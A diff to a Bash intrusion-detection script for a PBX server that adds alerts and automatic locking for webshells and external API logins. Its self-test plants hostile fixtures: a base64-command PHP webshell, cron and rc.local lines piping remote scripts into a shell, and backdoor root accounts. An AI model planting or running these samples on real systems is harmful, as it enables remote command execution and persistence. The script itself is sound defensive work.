@@ -781,11 +781,13 @@ check_pbxapi_abuse() {
       case "$ip" in 127.0.0.1|::1|::ffff:127.0.0.1) continue ;; esac
       ep="$(printf '%s' "$hit" | sed -E 's/.*"[A-Z]+ (\/pbxapi\/[A-Za-z_]+(\/[A-Za-z_]+)?)[^ ]* HTTP.*/\1/')"
       code="$(printf '%s' "$hit" | sed -E 's/.*" ([0-9]{3}) .*/\1/')"
+      if [ "$ep" = "/pbxapi/authenticate" ] && [ -e "${SENTINEL_PBXAPI_OPEN:-/etc/ipbx/pbxapi-externo.liberado}" ]; then continue; fi  # cliente liberou a API por fora de proposito
       seen_once "pbxapi|$ip|$ep" || continue
       n=$((n+1)); [ "$n" -le 3 ] || continue
       log "PBXAPI abuso: $ip $ep ($code)"
+      if [ "$ep" = "/pbxapi/authenticate" ]; then send_telegram "ALERTA: LOGIN NA API DO PBX VINDO DE FORA"$'\n'"O IP $ip entrou na API da central (resposta $code) com a senha de admin. Nos dois ataques de nov/2026 esse foi o primeiro passo. Troque a senha do admin e confira o servidor (ipbx-sentinel --audit)."$'\n'"$(printf '%s' "$hit" | cut -c1-200)"; continue; fi
       send_telegram "ALERTA: INVASAO PELA API DO PBX"$'\n'"O IP $ip chamou $ep com sucesso (resposta $code). Esse caminho cria regras no dialplan ou executa comandos no servidor."$'\n'"$(printf '%s' "$hit" | cut -c1-200)"$'\n\n'"Troque AGORA a senha do admin do PBX e as demais senhas, remova regras em Injecoes do PBX e rode: ipbx-sentinel --scan. Confira o bloqueio: /etc/httpd/conf.d/ipbx-pbxapi.conf"
-    done < <(tail -n 5000 "$l" 2>/dev/null | grep -aE '"[A-Z]+ /pbxapi/(manager|dialplaninjection)[^ ]* HTTP/[0-9.]+" 20[0-9] ')
+    done < <(tail -n 5000 "$l" 2>/dev/null | grep -aE '"[A-Z]+ /pbxapi/(manager|dialplaninjection|authenticate)[^ ]* HTTP/[0-9.]+" 20[0-9] ')
   done
 }
 
@@ -809,13 +811,34 @@ check_web_dumps() {
   done < <(find "$WEB_DIR" -maxdepth 2 -type f \( -name '*.txt' -o -name '*.sql' -o -name 'drop_*' -o -name 'PBX.php' \) 2>/dev/null | head -n 200)
 }
 
-# Modulo "Dialplan Injection": permite escrever comandos de dialplan (inclusive System/Shell) pelo painel ou pela API.
-# Nenhum cliente precisa dele e foi o caminho do invasor; so alerta (remover e decisao do tecnico).
+# Modulo "Dialplan Injection": faz parte da central (aparece em todos os servidores) e sozinho NAO e perigo: o perigo e
+# quem o usa. Por isso so fica no registro (e na auditoria); o alerta vem de check_dialplan_injection (regra injetada)
+# e de check_pbxapi_abuse (chamada externa). Nao e removido: nao mexemos na estrutura padrao da central.
 check_dialplan_module() {
   [ -d "$WEB_DIR/admin/modules/dialplaninjection" ] || return 0
   seen_once "dpmodule|$HOSTNAME_S" || return 0
   log "MODULO Dialplan Injection instalado"
-  send_telegram "ALERTA: MODULO PERIGOSO INSTALADO"$'\n'"O modulo Dialplan Injection esta instalado neste servidor. Ele permite escrever comandos no dialplan (executar comandos no servidor) e foi usado na invasao de 26/11/2026."$'\n\n'"Nada foi alterado. Desinstale em Modulos do painel clássico (ou: fwconsole ma delete dialplaninjection) e apague as regras de Injecoes do PBX."
+}
+
+# Webshell plantada pela API dentro de /pbxapi (incidente 17/11 no v5-Prisma): a API cria um .php la (sh.php) e o executa
+# com ?p=senha&c=comando em base64. Alerta e TRANCA (chmod 000, reversivel) qualquer .php fora dos arquivos originais
+# da API, ou com codigo de execucao remota (system(base64_decode / eval($_REQUEST...)).
+check_pbxapi_dir() {
+  local d="${SENTINEL_PBXAPI_DIR:-$WEB_DIR/pbxapi}" f b
+  [ -d "$d" ] || return 0
+  while read -r f; do
+    [ -n "$f" ] || continue
+    b="$(basename "$f")"
+    if [ "$(dirname "$f")" = "$d" ]; then
+      case "$b" in index.php|Parsedown.php|readme.php) grep -qaE 'system *\( *base64_decode|(eval|assert|passthru|shell_exec|system) *\( *\$_(REQUEST|POST|GET)' "$f" 2>/dev/null || continue ;; esac
+    else
+      grep -qaE 'system *\( *base64_decode|(eval|assert|passthru|shell_exec|system) *\( *\$_(REQUEST|POST|GET)' "$f" 2>/dev/null || continue
+    fi
+    [ "$(stat -c %a "$f" 2>/dev/null)" = "0" ] || { chmod 000 "$f" 2>/dev/null; log "WEBSHELL trancada (chmod 000): $f"; }
+    seen_once "pbxapidir|$f" || continue
+    log "WEBSHELL na pasta da API: $f"
+    send_telegram "ALERTA: WEBSHELL NA PASTA DA API DO PBX"$'\n'"$f e um arquivo que executa comandos no servidor (nao faz parte da API). O acesso a ele ja foi trancado (chmod 000)."$'\n'"Servidor: $HOSTNAME_S"
+  done < <(find "$d" -maxdepth 3 -type f -name '*.php' 2>/dev/null | head -n 300)
 }
 
 # Webshell em uso: requisicao a um .php com parametro de comando (?cmd=, ?exec= ...), tipico de quem testa/usa uma
@@ -833,11 +856,11 @@ check_webshell_hits() {
       n=$((n+1)); [ "$n" -le 3 ] || continue
       log "WEBSHELL em uso: $ip $path ($code)"
       send_telegram "ALERTA: WEBSHELL EM USO"$'\n'"IP $ip acessou $path com parametro de comando (resposta $code$([ "$code" = 200 ] && echo ', o arquivo EXECUTOU')):"$'\n'"$(printf '%s' "$hit" | cut -c1-200)"$'\n\n'"Isole o arquivo (ipbx-sentinel --scan), troque as senhas e rode ipbx-sentinel --audit. Se a resposta foi 200, o invasor ja executa comandos."
-    done < <(tail -n 3000 "$l" 2>/dev/null | grep -aE '"(GET|POST) [^"]*\.php\?(cmd|exec|shell|command|system|passthru)=')
+    done < <(tail -n 3000 "$l" 2>/dev/null | grep -aE '"(GET|POST) [^"]*\.php\?(cmd|exec|shell|command|system|passthru)=|"(GET|POST) /pbxapi/[A-Za-z0-9_.-]+\.php\?[^ ]*c=' | grep -avE '"(GET|POST) /pbxapi/(index|readme|Parsedown)\.php')
   done
 }
 
-host_checks() { check_firewall; check_fail2ban; check_dialplan; check_dialplan_injection; check_dialplan_module; check_pbxapi_abuse; check_web_dumps; check_webshell_hits; check_cron; check_framework; check_persistence; check_immutable; check_botnet; }
+host_checks() { check_firewall; check_fail2ban; check_dialplan; check_dialplan_injection; check_dialplan_module; check_pbxapi_dir; check_pbxapi_abuse; check_web_dumps; check_webshell_hits; check_cron; check_framework; check_persistence; check_immutable; check_botnet; }
 
 do_scan() {
   local mode="$1"
@@ -979,6 +1002,8 @@ cmd_selftest() {
   printf '===== DB CREDS PARSED =====\nAMPDBPASS=segredo\n' > "$T/web/zt9loot.txt"; chmod 644 "$T/web/zt9loot.txt"
   printf 'User-agent: *\nDisallow:\n' > "$T/web/robots.txt"; chmod 644 "$T/web/robots.txt"
   mkdir -p "$T/web/admin/modules/dialplaninjection"
+  mkdir -p "$T/web/pbxapi"; printf '<?php echo 1;\n' > "$T/web/pbxapi/index.php"; printf '<?php if($_REQUEST["p"]!="x")die;system(base64_decode($_REQUEST["c"]));?>' > "$T/web/pbxapi/sh.php"; chmod 644 "$T/web/pbxapi/index.php" "$T/web/pbxapi/sh.php"
+  printf '160.119.76.136 - - [17/Nov/2026:17:47:01 -0300] "GET /pbxapi/authenticate HTTP/1.1" 200 120 "-" "Mozilla/5.0"\n160.119.76.136 - - [17/Nov/2026:17:47:06 -0300] "GET /pbxapi/sh.php?p=x&c=aWQ%%3D HTTP/1.1" 200 40 "-" "Mozilla/5.0"\n' >> "$T/access_log"
   echo '* * * * * curl http://exemplo.invalido/x | sh' > "$T/cron/asterisk"
   printf 'root:x:0:0:root:/root:/bin/bash\nyum:x:0:0::/home/yum:/bin/bash\nabort:x:0:0::/:/bin/bash\nasterisk:x:100:100::/:/bin/bash\n' > "$T/passwd"
   printf '#!/bin/bash\n/usr/local/sbin/motd.sh > /etc/motd\nbash -c "curl -ks http://203.0.113.9/r/postroot.sh|bash"\n' > "$T/rc.local"
@@ -997,6 +1022,11 @@ cmd_selftest() {
   # o dump foi trancado (chmod 000), o .txt inocente nao; chamadas locais/403 nao geram alerta de API
   if [ "$(stat -c %a "$T/web/zt9loot.txt" 2>/dev/null)" = "0" ]; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: zt9loot.txt deveria estar trancado (chmod 000)"; fi
   if [ "$(stat -c %a "$T/web/robots.txt" 2>/dev/null)" = "644" ]; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: robots.txt nao podia ser alterado"; fi
+  for k in "PBXAPI abuso: 160.119.76.136 /pbxapi/authenticate" "WEBSHELL na pasta da API: $T/web/pbxapi/sh.php" "WEBSHELL em uso: 160.119.76.136 /pbxapi/sh.php"; do
+    if grep -qF "$k" "$T/log"; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: alerta '$k' nao gerado"; fi
+  done
+  if [ "$(stat -c %a "$T/web/pbxapi/sh.php" 2>/dev/null)" = "0" ]; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: pbxapi/sh.php deveria estar trancado"; fi
+  if [ "$(stat -c %a "$T/web/pbxapi/index.php" 2>/dev/null)" = "644" ]; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: pbxapi/index.php original nao podia ser alterado"; fi
   for k in "PBXAPI abuso: 127.0.0.1" "PBXAPI abuso: 45.154.138.99"; do
     if grep -qF "$k" "$T/log"; then bad=$((bad+1)); echo "FALHA: alerta indevido '$k'"; else ok=$((ok+1)); fi
   done
